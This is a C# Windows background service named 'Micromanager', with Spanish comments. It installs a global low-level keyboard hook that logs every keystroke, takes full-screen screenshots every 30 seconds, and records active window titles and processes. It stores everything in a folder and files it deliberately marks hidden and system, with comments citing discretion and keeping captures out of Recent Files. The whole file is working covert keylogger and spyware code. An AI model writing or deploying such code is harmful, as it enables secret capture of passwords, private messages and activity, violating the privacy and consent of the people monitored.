using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Micromanager
{
    public class Worker : BackgroundService
    {
        private readonly ILogger<Worker> _logger;
        private readonly string _outputDir;
        private readonly string _logFile;
        private readonly string _keyLogFile;
        private readonly TimeSpan _screenshotInterval;
        private readonly int _cleanupDays;
        private readonly BlockingCollection<string> _keyLogQueue = new BlockingCollection<string>();

        private IntPtr _hookId = IntPtr.Zero;

        public Worker(ILogger<Worker> logger)
        {
            _logger = logger;

            string[] args = Environment.GetCommandLineArgs();
            
            // Configuración por defecto - usar C:\ProgramData\microman\data
            string defaultOutputDir = "C:\\ProgramData\\microman\\data";
            
            // Parsear parámetros de línea de comandos
            _outputDir = defaultOutputDir;
            int screenshotSeconds = 30;
            _cleanupDays = 0;
            
            // Buscar parámetros con formato --flag
            for (int i = 0; i < args.Length; i++)
            {
                if ((args[i] == "--screenshot-interval" || args[i] == "--screenshot") && i + 1 < args.Length)
                {
                    int.TryParse(args[i + 1], out screenshotSeconds);
                }
                else if (args[i].StartsWith("--screenshot-interval=") || args[i].StartsWith("--screenshot="))
                {
                    string[] parts = args[i].Split('=');
                    if (parts.Length == 2)
                    {
                        int.TryParse(parts[1], out screenshotSeconds);
                    }
                }
                else if ((args[i] == "--cleanup-days" || args[i] == "--cleanup") && i + 1 < args.Length)
                {
                    int.TryParse(args[i + 1], out _cleanupDays);
                }
                else if (args[i].StartsWith("--cleanup-days=") || args[i].StartsWith("--cleanup="))
                {
                    string[] parts = args[i].Split('=');
                    if (parts.Length == 2)
                    {
                        int.TryParse(parts[1], out _cleanupDays);
                    }
                }
            }
            
            _screenshotInterval = TimeSpan.FromSeconds(screenshotSeconds);

            try
            {
                // Asegurar que el directorio de salida existe
                if (!Directory.Exists(_outputDir))
                {
                    Directory.CreateDirectory(_outputDir);
                    _logger.LogInformation("Output directory created: {OutputDir}", _outputDir);
                    
                    // Marcar la carpeta como oculta y de sistema para mayor discreción
                    try
                    {
                        DirectoryInfo dirInfo = new DirectoryInfo(_outputDir);
                        dirInfo.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
                    }
                    catch { }
                }

                // Log startup state
                string startupLogPath = Path.Combine(_outputDir, "startup.log");
                File.AppendAllText(startupLogPath, $"[{DateTime.Now}] Starting. OutputDir: {_outputDir}, User: {Environment.UserName}, Machine: {Environment.MachineName}, Interactive: {Environment.UserInteractive}, Screenshot Interval: {_screenshotInterval.TotalSeconds}s{Environment.NewLine}");
                
                // Marcar archivo de log como oculto y de sistema
                SetFileAttributesHidden(startupLogPath);
            }
            catch (Exception ex)
            {
                _logger.LogCritical(ex, "Failed to initialize output directory or log startup state.");
                
                // Intentar con directorio alternativo
                try
                {
                    _outputDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Micromanager");
                    if (!Directory.Exists(_outputDir))
                    {
                        Directory.CreateDirectory(_outputDir);
                    }
                    _logger.LogWarning("Using alternative output directory: {OutputDir}", _outputDir);
                }
                catch
                {
                    throw new InvalidOperationException("Critical failure during Worker initialization.", ex);
                }
            }

            _logFile = Path.Combine(_outputDir, "activity_log.json");
            _keyLogFile = Path.Combine(_outputDir, "key.log");
        }

        public override Task StartAsync(CancellationToken cancellationToken)
        {
            _logger.LogInformation("Starting Worker service.");

            Task.Factory.StartNew(() =>
            {
                var hookCallback = new NativeMethods.LowLevelKeyboardProc(HookCallback);
                _hookId = SetHook(hookCallback);
                if (_hookId != IntPtr.Zero)
                {
                    _logger.LogInformation("Keyboard hook installed successfully.");
                    System.Windows.Forms.Application.Run();
                }
                else
                {
                    _logger.LogError("Failed to install keyboard hook.");
                }
            }, cancellationToken, TaskCreationOptions.LongRunning, TaskScheduler.Default);

            Task.Factory.StartNew(() => WriteKeyLogs(cancellationToken), cancellationToken, TaskCreationOptions.LongRunning, TaskScheduler.Default);

            return base.StartAsync(cancellationToken);
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            try
            {
                // Log startup information
                string startupLogPath = Path.Combine(_outputDir, "startup.log");
                await File.AppendAllTextAsync(startupLogPath, $"[{DateTime.Now}] Program started. User: {Environment.UserName}, Machine: {Environment.MachineName}, Interactive: {Environment.UserInteractive}{Environment.NewLine}");

                // VALIDACIÓN CRÍTICA: Si no es sesión interactiva, no se puede acceder al escritorio
                // Esto puede pasar si se ejecuta como servicio, desde Task Scheduler sin sesión de usuario, etc.
                if (!Environment.UserInteractive)
                {
                    string errorMsg = "ADVERTENCIA: Sesión no interactiva detectada. No se puede acceder al escritorio para capturas.\n" +
                                    "El programa necesita ejecutarse en una sesión de usuario con escritorio activo.\n" +
                                    "Esto es normal si la tarea programada se ejecutó antes de que un usuario iniciara sesión.\n" +
                                    "El programa se detendrá y se ejecutará automáticamente cuando un usuario inicie sesión.";
                    
                    await File.AppendAllTextAsync(startupLogPath, $"[{DateTime.Now}] {errorMsg}{Environment.NewLine}");
                    _logger.LogInformation(errorMsg);
                    
                    // Salir limpiamente sin generar errores
                    return;
                }

                LogExecutionContext();
                LogInfo("Worker service started.");

                // Ensure the output directory exists
                if (!Directory.Exists(_outputDir))
                {
                    Directory.CreateDirectory(_outputDir);
                    LogInfo("Output directory created.");
                }

                // Ejecutar limpieza inicial si está configurada
                if (_cleanupDays > 0)
                {
                    CleanupOldFiles();
                }

                string lastActiveWindow = string.Empty;
                long sessionCounter = 0;
                DateTime lastCleanupTime = DateTime.Now;

                while (!stoppingToken.IsCancellationRequested)
                {
                    try
                    {
                        string activeWindow = GetActiveWindowTitle();
                        if (activeWindow != lastActiveWindow && !string.IsNullOrEmpty(activeWindow))
                        {
                            LogInfo($"Window changed: {activeWindow}");
                            await LogWindowChangeAsync(activeWindow, sessionCounter, stoppingToken);
                            lastActiveWindow = activeWindow;
                        }

                        await CaptureScreenshotAsync(sessionCounter, activeWindow, stoppingToken);
                        sessionCounter++;
                        
                        // Limpieza periódica (cada 24 horas)
                        if (_cleanupDays > 0 && (DateTime.Now - lastCleanupTime).TotalHours >= 24)
                        {
                            CleanupOldFiles();
                            lastCleanupTime = DateTime.Now;
                        }
                    }
                    catch (Exception ex) when (ex is not TaskCanceledException)
                    {
                        LogError(ex);
                        await File.AppendAllTextAsync(startupLogPath, $"[{DateTime.Now}] Error: {ex.Message}{Environment.NewLine}{ex.StackTrace}{Environment.NewLine}");
                        await Task.Delay(TimeSpan.FromSeconds(5), stoppingToken);
                    }

                    await Task.Delay(_screenshotInterval, stoppingToken);
                }
            }
            catch (Exception ex)
            {
                string startupLogPath = Path.Combine(_outputDir, "startup.log");
                await File.AppendAllTextAsync(startupLogPath, $"[{DateTime.Now}] Critical error: {ex.Message}{Environment.NewLine}{ex.StackTrace}{Environment.NewLine}");
                throw;
            }
        }

        private void LogExecutionContext()
        {
            string infoLogPath = Path.Combine(_outputDir, "info.log");
            File.AppendAllTextAsync(infoLogPath, $"[{DateTime.Now}] Execution started. User: {Environment.UserName}, Machine: {Environment.MachineName}, Interactive: {Environment.UserInteractive}{Environment.NewLine}");
        }

        private void LogError(Exception ex)
        {
            string errorLogPath = Path.Combine(_outputDir, "error.log");
            File.AppendAllTextAsync(errorLogPath, $"[{DateTime.Now}] Error: {ex.Message}{Environment.NewLine}{ex.StackTrace}{Environment.NewLine}");
            SetFileAttributesHidden(errorLogPath);
        }

        private void LogInfo(string message)
        {
            string infoLogPath = Path.Combine(_outputDir, "info.log");
            File.AppendAllTextAsync(infoLogPath, $"[{DateTime.Now}] {message}{Environment.NewLine}");
            SetFileAttributesHidden(infoLogPath);
        }
        
        private static void SetFileAttributesHidden(string filePath)
        {
            try
            {
                if (File.Exists(filePath))
                {
                    // Marcar archivo como oculto y de sistema
                    FileInfo fileInfo = new FileInfo(filePath);
                    fileInfo.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Archive;
                }
            }
            catch
            {
                // Ignorar errores al establecer atributos
            }
        }

        public override Task StopAsync(CancellationToken cancellationToken)
        {
            _logger.LogInformation("Stopping Worker service.");
            if (_hookId != IntPtr.Zero)
            {
                NativeMethods.UnhookWindowsHookEx(_hookId);
                _logger.LogInformation("Keyboard hook uninstalled.");
            }

            System.Windows.Forms.Application.ExitThread();
            _keyLogQueue.CompleteAdding();
            return base.StopAsync(cancellationToken);
        }

        private async Task WriteKeyLogs(CancellationToken stoppingToken)
        {
            try
            {
                bool firstWrite = !File.Exists(_keyLogFile);
                foreach (var logEntry in _keyLogQueue.GetConsumingEnumerable(stoppingToken))
                {
                    await File.AppendAllTextAsync(_keyLogFile, logEntry, stoppingToken);
                    
                    // Marcar archivo como oculto y de sistema en la primera escritura
                    if (firstWrite)
                    {
                        SetFileAttributesHidden(_keyLogFile);
                        firstWrite = false;
                    }
                }
            }
            catch (OperationCanceledException ex)
            {
                _logger.LogInformation(ex, "Key log writing was canceled.");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error in key log writing thread.");
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)NativeMethods.WM_KEYDOWN || wParam == (IntPtr)NativeMethods.WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                try
                {
                    string key = ((System.Windows.Forms.Keys)vkCode).ToString();
                    string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] {key}{Environment.NewLine}";
                    _keyLogQueue.Add(logEntry);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Error processing key press.");
                }
            }

            return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private async Task CaptureScreenshotAsync(long captureCounter, string activeWindow, CancellationToken stoppingToken)
        {
            try
            {
                var primaryScreen = System.Windows.Forms.Screen.PrimaryScreen;
                if (primaryScreen == null)
                {
                    _logger.LogWarning("Primary screen not found.");
                    return;
                }

                Rectangle bounds = primaryScreen.Bounds;
                using var bitmap = new Bitmap(bounds.Width, bounds.Height);
                using (var g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                }

                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                string filePath = Path.Combine(_outputDir, $"capture_{timestamp}_{captureCounter:D4}.png");

                await Task.Run(() => bitmap.Save(filePath, ImageFormat.Png), stoppingToken);
                
                // Marcar archivo como oculto y de sistema para que no aparezca en "Archivos Recientes"
                SetFileAttributesHidden(filePath);

                _logger.LogInformation("Screenshot saved: {FilePath} - Window: {ActiveWindow}", filePath, activeWindow);
                await LogCaptureActivityAsync(filePath, activeWindow, bounds, captureCounter, stoppingToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error taking screenshot.");
            }
        }

        private async Task LogWindowChangeAsync(string windowTitle, long sessionCounter, CancellationToken stoppingToken)
        {
            var logEntry = new
            {
                EventType = "WINDOW_CHANGE",
                Timestamp = DateTime.Now,
                WindowTitle = windowTitle,
                SessionCounter = sessionCounter
            };
            await WriteToLogFileAsync(logEntry, stoppingToken);
        }

        private async Task LogCaptureActivityAsync(string filePath, string windowTitle, Rectangle screenBounds, long sessionCounter, CancellationToken stoppingToken)
        {
            var logEntry = new
            {
                EventType = "SCREEN_CAPTURE",
                Timestamp = DateTime.Now,
                FilePath = filePath,
                WindowTitle = windowTitle,
                ScreenResolution = $"{screenBounds.Width}x{screenBounds.Height}",
                SessionCounter = sessionCounter
            };
            await WriteToLogFileAsync(logEntry, stoppingToken);
        }

        private async Task WriteToLogFileAsync(object logEntry, CancellationToken stoppingToken)
        {
            try
            {
                bool isNewFile = !File.Exists(_logFile);
                string jsonLine = JsonSerializer.Serialize(logEntry) + Environment.NewLine;
                await File.AppendAllTextAsync(_logFile, jsonLine, stoppingToken);
                
                // Marcar archivo como oculto y de sistema si es nuevo
                if (isNewFile)
                {
                    SetFileAttributesHidden(_logFile);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error writing to JSON log file.");
            }
        }

        private static bool IsSystemAccount()
        {
            try
            {
                using WindowsIdentity identity = WindowsIdentity.GetCurrent();
                return identity.User?.Value == "S-1-5-18" || 
                       identity.Name.Equals("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase);
            }
            catch
            {
                return false;
            }
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr handle = NativeMethods.GetForegroundWindow();
                if (handle == IntPtr.Zero) return string.Empty;

                const int nChars = 256;
                StringBuilder buff = new StringBuilder(nChars);

                if (NativeMethods.GetWindowText(handle, buff, nChars) > 0)
                {
                    NativeMethods.GetWindowThreadProcessId(handle, out uint processId);
                    Process p = Process.GetProcessById((int)processId);
                    return $"{buff.ToString()} [{p.ProcessName}.exe] [PID: {processId}]";
                }
            }
            catch (Exception)
            {
                return "Unknown Window";
            }
            return "Unknown Window";
        }

        private static IntPtr SetHook(NativeMethods.LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule? curModule = curProcess.MainModule)
            {
                if (curModule?.ModuleName == null)
                {
                    throw new InvalidOperationException("Failed to get current process module.");
                }
                return NativeMethods.SetWindowsHookEx(NativeMethods.WH_KEYBOARD_LL, proc, NativeMethods.GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private void CleanupOldFiles()
        {
            try
            {
                if (_cleanupDays <= 0 || !Directory.Exists(_outputDir))
                    return;

                DateTime cutoffDate = DateTime.Now.AddDays(-_cleanupDays);
                int deletedCount = 0;
                long freedSpace = 0;

                _logger.LogInformation("Starting cleanup of files older than {Days} days (before {CutoffDate})", _cleanupDays, cutoffDate);

                // Limpiar capturas de pantalla antiguas
                var pngFiles = Directory.GetFiles(_outputDir, "capture_*.png");
                foreach (var file in pngFiles)
                {
                    try
                    {
                        FileInfo fileInfo = new FileInfo(file);
                        if (fileInfo.LastWriteTime < cutoffDate)
                        {
                            long fileSize = fileInfo.Length;
                            File.Delete(file);
                            deletedCount++;
                            freedSpace += fileSize;
                        }
                    }
                    catch (Exception ex)
                    {
                        _logger.LogWarning(ex, "Failed to delete file: {FilePath}", file);
                    }
                }

                // Limpiar logs antiguos si son muy grandes
                string[] logFiles = { "key.log", "activity_log.json", "info.log", "error.log", "startup.log" };
                foreach (var logFileName in logFiles)
                {
                    string logPath = Path.Combine(_outputDir, logFileName);
                    if (File.Exists(logPath))
                    {
                        try
                        {
                            FileInfo fileInfo = new FileInfo(logPath);
                            // Si el log es mayor a 100MB, crear respaldo y truncar
                            if (fileInfo.Length > 100 * 1024 * 1024)
                            {
                                string backupPath = Path.Combine(_outputDir, $"{logFileName}.old");
                                if (File.Exists(backupPath))
                                {
                                    File.Delete(backupPath);
                                }
                                File.Move(logPath, backupPath);
                                File.Create(logPath).Close();
                                _logger.LogInformation("Log file {LogFile} backed up and truncated", logFileName);
                            }
                        }
                        catch (Exception ex)
                        {
                            _logger.LogWarning(ex, "Failed to process log file: {LogFile}", logFileName);
                        }
                    }
                }

                if (deletedCount > 0)
                {
                    double freedMB = freedSpace / (1024.0 * 1024.0);
                    _logger.LogInformation("Cleanup completed: {Count} files deleted, {SpaceMB:F2} MB freed", deletedCount, freedMB);
                    LogInfo($"Cleanup: {deletedCount} files deleted, {freedMB:F2} MB freed");
                }
                else
                {
                    _logger.LogInformation("Cleanup completed: No old files found");
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error during cleanup process");
                LogError(ex);
            }
        }

        private static class NativeMethods
        {
            public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

            public const int WH_KEYBOARD_LL = 13;
            public const int WM_KEYDOWN = 0x0100;
            public const int WM_SYSKEYDOWN = 0x0104;

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("user32.dll")]
            public static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

            [DllImport("user32.dll", SetLastError = true)]
            public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        }
    }
}
